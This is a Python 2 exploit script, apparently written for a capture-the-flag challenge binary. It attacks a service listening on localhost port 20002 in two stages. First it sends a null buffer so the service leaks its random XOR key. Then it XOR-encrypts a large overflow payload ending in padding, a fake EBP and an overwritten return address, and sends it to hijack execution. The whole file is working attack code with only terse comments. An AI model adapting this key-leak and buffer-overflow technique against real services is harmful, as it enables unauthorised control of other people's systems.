#!/usr/bin/python
import struct
import socket
import time


# Key Size GLobal Variable
key_sz = 32*4

# XOR cipher function
def crypt(value, key):
	print "[+] Cipher Key Length  : ", len(key)
	print "[+] Cipher Data Length : ", len(value)
	return ''.join([chr(ord(value[x])^ord(key[x % key_sz])) for x in range(len(value))])



# ===========================================================================
#               Stage One Generate Random Key And Leak it
# ==========================================================================


# Input
i = "\x00"*key_sz                # NULL Pointer (We will receive Pure Random Key In Output)
size = key_sz 

# Create Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 20002))

# print "[+] Receving Banner"
# print s.recv(100)



# Sending Data
print "[+] Stage 1 Starting... Trying To Retrive Victim Random Key"
s.send("E")                      # Condition E Bypass
time.sleep(0.5)
s.send(struct.pack("I", size))   # File Size
time.sleep(0.5)
s.send(i)                        # Send Payload
s.recv(128)                      # Recv Banner
time.sleep(2)
rec = s.recv(1024)                # Recv Key
print [rec]

# Extracting Data
rec = rec.split('\n')[1]
print "[+] Our Sent Input  : ", i
print "[+] Input Length    : ", len(i)
print "[+] Output Length   : ", len(rec)
print "[+] Output Size     : ", struct.unpack("I",rec[:4])
print "[+] Output          : ", rec[4:].encode('hex')       # Random Key

if int(struct.unpack("I",rec[:4])[0])+4!=len(rec):
	print "[X] ----------------------  Error -------------------------------- [X]"
	exit(0)
# Key
rkey = rec[4:]
print "[+] Stage 1 . Random Key Leakage Complete."



# ================================================================
#                    Second Stage (Send overflowing Data)
# ================================================================

print "[+] Stage 2 Started [Exploiting Buffer Overflow]."
# Generate Payload
# Trying Length = 34 * 4096

pattern = "a"*12           # paddings 
pattern+= "\x90"*4         # EBP
pattern+= struct.pack("i", 0x08048b3f) # EIP 
pattern+= "a"*4

payload = 'A' * (4096*32)  # 1025*128  # + "Q" #open('pat', 'r').read()
payload+= pattern



# Send Data (hahaha! Just Ignore Cipher Function Encryption)
print "[+] Encrypting Buffer Data"
i = crypt(payload, rkey) # Because Cipher Conquer Function Is Here
size = len(i)
print "[+] Encryption Complete."


# Clean socket.
#s.recv(0xffffff)
#s.send("Q")
time.sleep(0.5)

print "[+] Sending Payload"
s.send("E")
s.send(struct.pack("i", size))
s.send(i)


time.sleep(0.5)
rec = s.recv(len(payload)*2)
rec = rec.split('\n')[1]

# To Check Our Payload Output
# print "[+] Our Sent Input  : ", i
print "[+] Input Length    : ", len(i)
print "[+] Output Length   : ", len(rec)
print "[+] Output Size     : ", struct.unpack("I",rec[:4])
# print "[+] Output          : ", rec[4:]

s.send("Q")

s.close()

